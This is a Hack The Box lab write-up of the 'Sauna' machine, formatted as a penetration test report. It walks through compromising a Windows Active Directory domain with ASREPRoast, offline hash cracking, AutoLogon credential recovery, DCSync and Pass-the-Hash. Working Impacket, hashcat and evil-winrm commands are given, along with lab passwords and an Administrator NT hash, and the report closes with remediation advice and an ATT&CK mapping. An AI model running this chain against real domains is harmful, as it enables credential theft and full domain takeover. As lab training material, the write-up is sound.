# Penetration Test Report — Sauna

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-ASREPRoast%20%2F%20AutoLogon%20%2F%20DCSync-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `egotistical-bank.local`) derived username candidates from employee names published on the corporate website. An **ASREPRoast** attack recovered a crackable hash for `fsmith`, granting WinRM access. Automated enumeration (WinPEAS) exposed AutoLogon credentials for `svc_loanmgr`, whose **DS-Replication-Get-Changes-All** right enabled a **DCSync** attack — dumping the domain Administrator hash and achieving `NT AUTHORITY\SYSTEM` via Pass-the-Hash.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Kerberos pre-authentication disabled (`fsmith`) → ASREPRoast | High |
| 2 | Crackable password (rockyou.txt) | High |
| 3 | AutoLogon credentials stored in registry | High |
| 4 | `svc_loanmgr` holds DCSync (GetChangesAll) rights | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
```

DC for `egotistical-bank.local`; IIS (80) and LDAP (389). Anonymous LDAP binds returned no objects; SMB anonymous login returned no shares. The bank's `about.html` listed **employee full names**.

### 2. Foothold — ASREPRoast

Username permutations were generated with Username Anarchy:

```bash
./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
```

ASREPRoast via Impacket's GetNPUsers:

```bash
while read p; do
  GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip target.htb >> hash.txt
done < unames.txt
```

A hash was returned for **fsmith** (pre-auth disabled). Cracked with hashcat mode 18200:

```bash
hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force
# fsmith : Thestrokes23
```

WinRM access:

```bash
evil-winrm -i target.htb -u fsmith -p 'Thestrokes23'
```

User flag: `C:\Users\Fsmith\Desktop`.

### 3. Privilege Escalation — AutoLogon & DCSync

WinPEAS (uploaded via Evil-WinRM) revealed AutoLogon credentials:

```
EGOTISTICALBANK\svc_loanmanager : Moneymakestheworldgoround!
```

The local profile `svc_loanmgr` existed and the account was in Remote Management Users:

```bash
evil-winrm -i target.htb -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

BloodHound collection:

```bash
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' \
  -d EGOTISTICALBANK.LOCAL -ns target.htb -c All
sudo neo4j console
```

Query **Find Principals with DCSync Rights** showed `SVC_LOANMGR` → `EGOTISTICAL-BANK.LOCAL` via **GetChangesAll**.

DCSync with secretsdump:

```bash
secretsdump.py egotistical-bank/svc_loanmgr@target.htb -just-dc-user Administrator
# Administrator NT: d9485863c1e9e05851aa40cbb4ab9dff
```

Pass-the-Hash:

```bash
psexec.py egotistical-bank.local/administrator@target.htb \
  -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff
```

SYSTEM shell; root flag at `C:\Users\Administrator\Desktop`.

## Remediation

- Enforce Kerberos pre-authentication on all accounts; alert on AS-REQ without pre-auth.
- Enforce strong password policy (AS-REP hashes are offline-cracked).
- Remove AutoLogon credentials; use LAPS/gMSA for service accounts.
- Restrict replication rights (GetChangesAll) to DC machine accounts; alert on DCSync.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Credential Access | T1558.004 — AS-REP Roasting |
| Credential Access | T1552.002 — Credentials in Registry (AutoLogon) |
| Credential Access | T1003.006 — DCSync |
| Lateral Movement | T1550.002 — Pass the Hash |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
